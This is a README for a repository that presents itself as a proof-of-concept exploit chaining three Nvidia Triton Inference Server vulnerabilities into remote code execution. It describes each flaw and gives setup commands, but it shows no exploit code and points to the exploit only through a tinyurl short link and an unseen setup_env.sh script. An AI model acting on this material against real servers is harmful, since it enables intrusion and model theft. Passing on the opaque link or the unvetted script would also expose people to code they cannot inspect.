# Triton Inference Server Exploit PoC

This repository contains a proof-of-concept (PoC) exploit for a chain of vulnerabilities in Nvidia's Triton Inference Server (CVE-2025-23320, CVE-2025-23319, CVE-2025-23334). These vulnerabilities, discovered by Wiz Research, allow for remote code execution (RCE) by exploiting flaws in the Python backend and shared memory API. This PoC is intended for research and demonstration purposes only, to assist in understanding and mitigating these vulnerabilities.

**WARNING**: This code is for educational and testing purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. The authors are not responsible for misuse of this code.

## Vulnerabilities

- **CVE-2025-23320 (CVSS 7.5)**: A verbose error message in the Python backend reveals the unique name of the internal IPC shared memory region when a large request exceeds the shared memory limit.
- **CVE-2025-23319 (CVSS 8.1)**: An out-of-bounds write vulnerability in the shared memory API due to insufficient validation of the provided memory region key.
- **CVE-2025-23334 (CVSS 5.9)**: An out-of-bounds read vulnerability in the shared memory API, allowing unauthorized access to sensitive data.

When chained, these vulnerabilities enable full control of the Triton Inference Server, potentially leading to AI model theft, data breaches, or further network compromise.

Exploit - [href](https://tinyurl.com/45258j9u)

## Prerequisites

- Python 3.8+
- Nvidia Triton Inference Server (vulnerable versions < 25.07)
- Dependencies listed in `requirements.txt`

## Setup

1. Set up the environment:
   ```bash
   chmod +x setup_env.sh
   ./setup_env.sh
   ```

2. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Set up a local or remote Triton Inference Server instance (version < 25.07 for testing).

## Disclaimer

This PoC is provided for educational purposes only. Use it responsibly and only on systems you have explicit permission to test. The authors are not liable for any damages caused by misuse.
